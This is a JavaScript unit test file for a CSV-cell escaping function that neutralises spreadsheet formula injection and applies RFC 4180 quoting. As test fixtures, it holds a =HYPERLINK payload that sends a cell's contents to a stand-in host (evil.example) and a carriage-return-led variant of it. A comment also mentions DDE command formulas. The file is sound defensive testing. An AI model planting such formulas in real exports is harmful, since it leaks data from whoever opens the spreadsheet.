/**
 * CSV-cell escaping tests (issue #289).
 *
 * exportAsCSV in archiveService.js quoted commas, quotes, and newlines but did
 * not neutralise spreadsheet formula injection: a scraped or submitted field
 * beginning with =, +, -, @ (or a leading tab/CR/LF) was written verbatim, so a
 * downloaded CSV opened in Excel/Sheets/Numbers could execute attacker-supplied
 * formulas (=HYPERLINK exfiltration, =cmd|... DDE on old Excel). The escaping
 * now lives in frontend/utils/csvSafety.js so it can be unit-tested directly;
 * the trigger set mirrors the canonical Python neutraliser
 * (rosen_scraper.csv_safety.CSV_INJECTION_PREFIXES).
 */

import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { escapeCsvCell } from '../frontend/utils/csvSafety.js';

describe('escapeCsvCell — formula-injection neutralisation', () => {
  it('prefixes a single quote on every spreadsheet formula trigger', () => {
    for (const trigger of ['=', '+', '-', '@', '\t', '\r', '\n']) {
      const out = escapeCsvCell(`${trigger}danger`);
      // Strip any RFC-4180 outer quoting first, then check the leading escape.
      const unwrapped = out.startsWith('"') ? out.slice(1, -1).replace(/""/g, '"') : out;
      assert.equal(unwrapped[0], "'",
        `a cell beginning with ${JSON.stringify(trigger)} must be prefixed with '`);
      assert.equal(unwrapped.slice(1), `${trigger}danger`,
        'neutralisation must preserve the original text after the escape');
    }
  });

  it('neutralises a real HYPERLINK exfiltration payload', () => {
    const payload = '=HYPERLINK("https://evil.example/?leak="&A2,"View")';
    const out = escapeCsvCell(payload);
    assert.ok(out.startsWith('"\'='),
      'a formula with commas/quotes must be both prefixed and RFC-4180 quoted');
  });

  it('does not double-escape an already-neutralised value', () => {
    // A value stored escaped on disk (e.g. "'@handle") starts with an
    // apostrophe, which is not itself a trigger, so it must pass through once.
    assert.equal(escapeCsvCell("'@JayRosen"), "'@JayRosen");
  });

  it('leaves an ordinary value untouched', () => {
    assert.equal(escapeCsvCell('Press think'), 'Press think');
  });

  it('only neutralises a trigger in the first position, not mid-string', () => {
    // A formula is only evaluated when the trigger leads the cell, so a mid
    // string =/+/-/@ must pass through unprefixed.
    assert.equal(escapeCsvCell('a=b'), 'a=b');
    assert.equal(escapeCsvCell('user@host'), 'user@host');
  });
});

describe('escapeCsvCell — RFC 4180 quoting', () => {
  it('wraps and doubles quotes when a cell contains a comma', () => {
    assert.equal(escapeCsvCell('Rosen, Jay'), '"Rosen, Jay"');
  });

  it('doubles embedded double quotes', () => {
    assert.equal(escapeCsvCell('say "hi"'), '"say ""hi"""');
  });

  it('wraps a cell containing a newline', () => {
    assert.equal(escapeCsvCell('line1\nline2'), '"line1\nline2"');
  });

  it('wraps a cell containing a bare carriage return', () => {
    assert.equal(escapeCsvCell('line1\rline2'), '"line1\rline2"');
  });

  it('quotes a CR-led formula so the payload cannot start a new row', () => {
    // \r is an RFC 4180 record terminator: without quoting, the apostrophe
    // stays on the prior row and "=HYPERLINK(...)" leads the next one.
    const out = escapeCsvCell('\r=HYPERLINK("https://evil.example",1)');
    assert.ok(out.startsWith('"') && out.endsWith('"'),
      'a CR-led formula cell must be RFC-4180 quoted so the \\r stays inside it');
    assert.equal(out, '"\'\r=HYPERLINK(""https://evil.example"",1)"');
  });
});

describe('escapeCsvCell — non-string inputs', () => {
  it('returns an empty string for null and undefined', () => {
    assert.equal(escapeCsvCell(null), '');
    assert.equal(escapeCsvCell(undefined), '');
  });

  it('coerces numbers to text without neutralising them', () => {
    assert.equal(escapeCsvCell(2024), '2024');
  });
});
